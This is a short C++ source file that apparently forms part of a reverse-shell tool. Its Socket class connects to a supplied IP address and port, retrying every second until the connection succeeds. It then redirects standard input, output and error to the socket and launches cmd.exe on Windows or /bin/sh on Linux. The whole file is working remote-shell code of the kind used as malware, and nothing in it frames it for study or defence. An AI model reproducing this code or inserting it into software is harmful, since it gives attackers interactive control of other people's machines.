#include "Socket.hpp"

namespace rsp {
    Socket::Socket(const uint16_t& port, std::string_view ip) {
        #if defined(RSP_WINDOWS)
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);
            m_socket = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
        #elif defined(RSP_LINUX)
            m_socket = socket(AF_INET, SOCK_STREAM, 0);
        #endif

        m_server.sin_family = AF_INET;
        m_server.sin_port = htons(port);
        m_server.sin_addr.s_addr = inet_addr(ip.data());
    }

    void Socket::Connect() {
        while(connect(m_socket, reinterpret_cast<sockaddr*>(&m_server), sizeof(m_server)) != 0) {
            RSP_ERROR("cant connect to server");
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }

        RSP_LOG("connected successfully");

        #if defined(RSP_WINDOWS)
            _dup2(m_socket, 0);
            _dup2(m_socket, 1);
            _dup2(m_socket, 2);

            system("cmd.exe");
            WSACleanup();
        #elif defined(RSP_LINUX)
            dup2(m_socket, 0);
            dup2(m_socket, 1);
            dup2(m_socket, 2);

            execl("/bin/sh", "sh", 0);
        #endif
    }
};